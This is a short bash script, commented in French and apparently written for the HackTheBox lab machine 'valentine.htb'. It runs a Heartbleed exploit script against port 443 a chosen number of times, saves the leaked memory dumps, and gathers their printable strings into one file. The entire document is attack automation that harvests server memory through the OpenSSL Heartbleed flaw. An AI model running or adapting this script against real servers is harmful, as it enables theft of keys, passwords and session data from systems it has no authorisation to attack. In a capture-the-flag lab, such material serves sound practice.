#!/bin/bash
# heartbleed_full.sh
# Lance plusieurs exploits Heartbleed et concatène les chaînes ASCII utiles

read -p "🔢 Nombre d'itérations Heartbleed à exécuter : " COUNT
TARGET="valentine.htb"
PORT=443
OUTDIR="dumps"
RESULT="out_ascii-full.txt"

mkdir -p "$OUTDIR"
rm -f $OUTDIR/out_*.txt "$RESULT"

for i in $(seq -f "%03g" 1 $COUNT); do
    echo "➡️  [Iteration $i]..."
    OUTFILE="$OUTDIR/out_$i.txt"
    python2 heartbleed-exploit.py "$TARGET" --port $PORT --output "$OUTFILE" --ascii >/dev/null 2>&1

    if grep -q '[[:print:]]\{4,\}' "$OUTFILE"; then
        strings "$OUTFILE" | grep -Eo '[[:print:]]{4,}' >> "$RESULT"
    else
        echo "❌ Aucun contenu utile détecté dans $OUTFILE"
        rm -f "$OUTFILE"
    fi
done

echo "✅ Terminé : chaînes ASCII utiles regroupées dans $RESULT"
